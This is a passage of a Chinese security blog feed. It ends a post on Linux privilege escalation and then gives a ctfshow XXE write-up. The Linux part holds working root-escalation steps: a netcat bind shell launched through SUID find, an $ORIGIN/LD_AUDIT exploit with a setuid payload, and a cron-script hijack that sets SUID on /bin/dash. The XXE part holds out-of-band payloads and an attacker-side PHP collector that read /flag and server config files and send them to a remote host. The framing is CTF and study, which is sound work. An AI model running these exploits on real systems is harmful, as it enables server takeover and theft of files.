<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;configure</span><br></pre></td></tr></table></figure></div>

<p><strong>5、配置完了再编译</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure></div>

<p>6、编译成功生成了netcat可执行文件，位与src目录，cd进去然后运行，成功升级到一个版本有-e命令的情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;netcat</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821113300025.png" alt="image-20210821113300025"></p>
</blockquote>
<p>接着我们回到刚刚那个步骤，这回命令得加./netcat，成功反弹了一个root权限的用户</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">find sky -exec .&#x2F;netcat -lvp 5555 -e &#x2F;bin&#x2F;sh \;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821114225235.png" alt="image-20210821114225235"></p>
</blockquote>
<p>其他文件的提权方法可以看看<a href="https://www.anquanke.com/post/id/86979" target="_blank" rel="noopener">suid提权</a>，我觉得suid提权主要是做后门吧。</p>
<h1 id="ORIGIN溢出提权"><a href="#ORIGIN溢出提权" class="headerlink" title="$ORIGIN溢出提权"></a>$ORIGIN溢出提权</h1><p>利用tmp目录权限、suid权限和C语言使普通账号提前为ROOT权限，适用范围RHEL5-6，CENTOS5-6</p>
<h2 id="提权方法"><a href="#提权方法" class="headerlink" title="提权方法"></a>提权方法</h2><p><strong>1、进入tmp目录，创建一个利用目录</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;tmp&#x2F;exploit</span><br></pre></td></tr></table></figure></div>

<p><strong>2、将/bin/ping 和 /tmp/exploit/target建立链接</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">ln &#x2F;bin&#x2F;ping &#x2F;tmp&#x2F;exploit&#x2F;target</span><br></pre></td></tr></table></figure></div>

<p><strong>3、将其加载到内存中</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">exec 3&lt; &#x2F;tmp&#x2F;exploit&#x2F;target</span><br><span class="line">接着可以查看他已经在内存中</span><br><span class="line">ls -l &#x2F;proc&#x2F;$$&#x2F;fd&#x2F;3</span><br><span class="line"></span><br><span class="line">lr-x------ 1 test test 64 08-21 23:05 &#x2F;proc&#x2F;3685&#x2F;fd&#x2F;3 -&gt; &#x2F;tmp&#x2F;exploit&#x2F;target</span><br></pre></td></tr></table></figure></div>

<p><strong>4、接着删除我们刚刚创建的文件</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">rm -rf &#x2F;tmp&#x2F;exploit</span><br><span class="line">他会依旧存在内存中</span><br><span class="line">ls -l &#x2F;proc&#x2F;$$&#x2F;fd&#x2F;3</span><br><span class="line"></span><br><span class="line">lr-x------ 1 test test 64 08-21 23:05 &#x2F;proc&#x2F;3685&#x2F;fd&#x2F;3 -&gt; &#x2F;tmp&#x2F;exploit&#x2F;target (deleted)</span><br></pre></td></tr></table></figure></div>

<p><strong>4、接着创建一个payload.c</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__((constructor)) init()</span><br><span class="line">&#123;</span><br><span class="line">   setuid(<span class="number">0</span>);</span><br><span class="line">   system(<span class="string">"/bin/bash"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后再gcc编译</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gcc -w -fPIC -shared -o &#x2F;tmp&#x2F;exploit payload.c</span><br><span class="line"></span><br><span class="line">接着exploit目录只能够会存在这样的东西</span><br><span class="line">ls -l &#x2F;tmp&#x2F;exploit</span><br><span class="line"></span><br><span class="line">-rwxrwxr-x 1 test test 4223 08-21 23:08 &#x2F;tmp&#x2F;exploit</span><br></pre></td></tr></table></figure></div>

<p><strong>5、提权执行下面命令,成功root权限</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">LD_AUDIT&#x3D;&quot;\$ORIGIN&quot; exec &#x2F;proc&#x2F;self&#x2F;fd&#x2F;3</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821151049263.png" alt="image-20210821151049263"></p>
</blockquote>
<h1 id="Linux-CRON-JOBS提权"><a href="#Linux-CRON-JOBS提权" class="headerlink" title="Linux CRON JOBS提权"></a>Linux CRON JOBS提权</h1><p>Cron jobs计划任务，通过/etc/crontab文件，可以设定系统定期执行的任务</p>
<p>crontab 文件只能是root权限 进行编辑</p>
<p>当我们得到一个非root权限的远程登录用户的时候<br><strong>查看etc/crontab 内容文件，发现存在一个py脚本计划</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821160816123.png" alt="image-20210821160816123"></p>
</blockquote>
<p>查看脚本内容，发现会删除cleanup目录里所有文件，根据计划是每隔两分钟一次</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821160924089.png" alt="image-20210821160924089"></p>
</blockquote>
<p><strong>接着很简单了，想要提权就直接给/bin/dash设置suid权限，运行之后就会得到root权限</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">将os.system(&#39;rm -r &#x2F;home&#x2F;moonteam&#x2F;cleanup&#x2F;*&#39;)替换成下面代码</span><br><span class="line"></span><br><span class="line">os.system(&#39;chmod u+s &#x2F;bin&#x2F;dash&#39;)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821162128673.png" alt="image-20210821162128673"></p>
</blockquote>
<p>接着再过两分钟，就可以执行/bin/dash命令来提权到root了，因为给/bin/dash加了suid权限</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821162554072.png" alt="image-20210821162554072"></p>
</blockquote>
<p>直接运行dash，就是root权限了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821162612344.png" alt="image-20210821162612344"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h3 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h3></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>SUID提权</tag>
        <tag>内核提权</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web篇-XXE wp</title>
    <url>/posts/101.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>记录web的题目wp，慢慢变强，铸剑。</p>
</blockquote>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p><strong>做XXE题目之前我们先了解一下XXE实体注入的原理和利用方法</strong></p>
<blockquote>
<p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819141610681.png" alt="image-20210819141610681"></p>
<p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：元素、属性、实体、PCDATA、CDATA，由于网上太多介绍就不详细说了</p>
<h3 id="DTD-文档类型定义"><a href="#DTD-文档类型定义" class="headerlink" title="DTD(文档类型定义)"></a>DTD(文档类型定义)</h3><p>DTD（document type defined）的作用是定义 XML 文档的合法构建模块。</p>
<p>DTD 可以在 XML 文档内声明，也可以外部引用。</p>
<p>而DTD的外部实体引用正是XXE漏洞诱因</p>
<p>首先写一个测试xml的文档的php代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test=$_POST[<span class="string">'xml'</span>];</span><br><span class="line">$obj = simplexml_load_string($test,<span class="string">'SimpleXMLElement'</span>,LIBXML_NOENT);</span><br><span class="line">print_r($obj);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h4 id="1、内部声明"><a href="#1、内部声明" class="headerlink" title="1、内部声明"></a><strong>1、内部声明</strong></h4><p>完整实例</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>      (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>将我们刚刚的php代码利用burp抓包post传入内部声明形式输出看看，注意：要url编码一下，不然&amp;无法被解析而报错</p>
<p>如下内部声明输出结果</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819142339515.png" alt="image-20210819142339515"></p>
</blockquote>
<h4 id="2、外部声明"><a href="#2、外部声明" class="headerlink" title="2、外部声明"></a>2、外部声明</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"note.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819142549954.png" alt="image-20210819142549954"></p>
</blockquote>
<p>同样编码一下，正常输出</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819142611233.png" alt="image-20210819142611233"></p>
</blockquote>
<p>由此，我们了解了基本的DTD内部和外部声明的使用</p>
<h3 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h3><blockquote>
<p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
</blockquote>
<p>实体又分为一般实体和参数实体<br>1，一般实体的声明语法:<br>引用实体的方式：&amp;实体名；<br>2，参数实体只能在DTD中使用，参数实体的声明格式：<br>引用实体的方式：%实体名；</p>
<h4 id="1、内部实体声明："><a href="#1、内部实体声明：" class="headerlink" title="1、内部实体声明："></a>1、内部实体声明：</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">writer</span> <span class="meta-string">"Bill Gates"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-string">"Copyright W3School.com.cn"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>post传进去看看输出结果，同样正常输出</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819142830986.png" alt="image-20210819142830986"></p>
</blockquote>
<h4 id="2、外部实体声明"><a href="#2、外部实体声明" class="headerlink" title="2、外部实体声明"></a>2、外部实体声明</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure></div>

<p>在了解了基础知识后，下面开始了解xml外部实体注入引发的问题。</p>
<h3 id="XXE的攻击方法"><a href="#XXE的攻击方法" class="headerlink" title="XXE的攻击方法"></a>XXE的攻击方法</h3><p>方法一：直接通过DTD外部实体声明</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xml</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///C:/1.txt"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xxe</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>发包访问我C盘目录中1.txt文件</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819143850362.png" alt="image-20210819143850362"></p>
</blockquote>
<p>方法二：通过DTD文档引入外部DTD文档，再引入外部实体声明，由于普通的引入外部实体声明就不说了，直接说如果不回显怎么办</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819144644467.png" alt="image-20210819144644467"></p>
</blockquote>
<p>当我们本地将php代码中的回显给关了，那我们怎么获取当前电脑的c:/1.txt文件呢？很简单，直接在公网域名上构造第一个php文件<code>x.php</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$content &#x3D; $_GET[&#39;1&#39;];</span><br><span class="line">if(isset($content))&#123;</span><br><span class="line">    file_put_contents(&#39;flag.txt&#39;,&#39;更新时间:&#39;.date(&quot;Y-m-d H:i:s&quot;).&quot;\n&quot;.$content);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#39;no data input&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>和第二个<code>xxe.xml</code>的外部实体文档</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;xml&#x2F;x.php?1&#x3D;%file;&#39;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819145202712.png" alt="image-20210819145202712"></p>
</blockquote>
<p>接着构造一个payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=c:/1.txt"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://127.0.0.1/xml/xxe.xml"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>post传参发包，发现生成了一个flag.txt</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819145349842.png" alt="image-20210819145349842"></p>
<p>接着我们就得到1.txt的base64的形式，解码一下,就可以得到其中的内容</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819145619095.png" alt="image-20210819145619095"></p>
</blockquote>
<p>支持的协议有哪些？</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819145646289.png" alt="image-20210819145646289"></p>
</blockquote>
<p>具体的根据情况会产生的危害：</p>
<p>1、读取任意文件</p>
<p>2、执行系统命令（expect需要扩展支持）</p>
<p>3、探测内网端口（利用http访问）</p>
<p>4、攻击内网网站等</p>
<h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br><span class="line">if(isset($xmlfile))&#123;</span><br><span class="line">    $dom &#x3D; new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    $creds &#x3D; simplexml_import_dom($dom);</span><br><span class="line">    $ctfshow &#x3D; $creds-&gt;ctfshow;</span><br><span class="line">    echo $ctfshow;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong><code>LIBXML_NOENT</code></strong>：替换实体</li>
<li><strong><code>LIBXML_DTDLOAD</code></strong>：加载外部子集</li>
</ul>
</blockquote>
<p>有了上面的xxe知识，这题无过滤轻松</p>
<p>先找一下网站根目录，我都用外部实体注入做</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=/etc/nginx/nginx.conf"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://www.xxxx.com/html/xxe.xml"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819182448689.png" alt="image-20210819182448689"></p>
</blockquote>
<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=/flag"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://www.xxx.com/html/xxe.xml"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819182643843.png" alt="image-20210819182643843"></p>
</blockquote>
<h2 id="web374"><a href="#web374" class="headerlink" title="web374"></a>web374</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($xmlfile))&#123;</span><br><span class="line">  $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">  $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>这题是无回显，利用上题一样的方法</p>
</blockquote>
<p>payload，抓包post发出去</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=/flag"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://www.hostname.com/html/xxe.xml"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819183906545.png" alt="image-20210819183906545"></p>
</blockquote>
<p>接着服务器拿flag</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819183925136.png" alt="image-20210819183925136"></p>
</blockquote>
<h2 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/&lt;\?xml version="1\.0"/'</span>, $xmlfile))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($xmlfile))&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>这题过滤了version的声明，但是发现删掉一样可以执行</p>
</blockquote>
<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;www.xxx.com&#x2F;html&#x2F;xxe.xml&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></div>

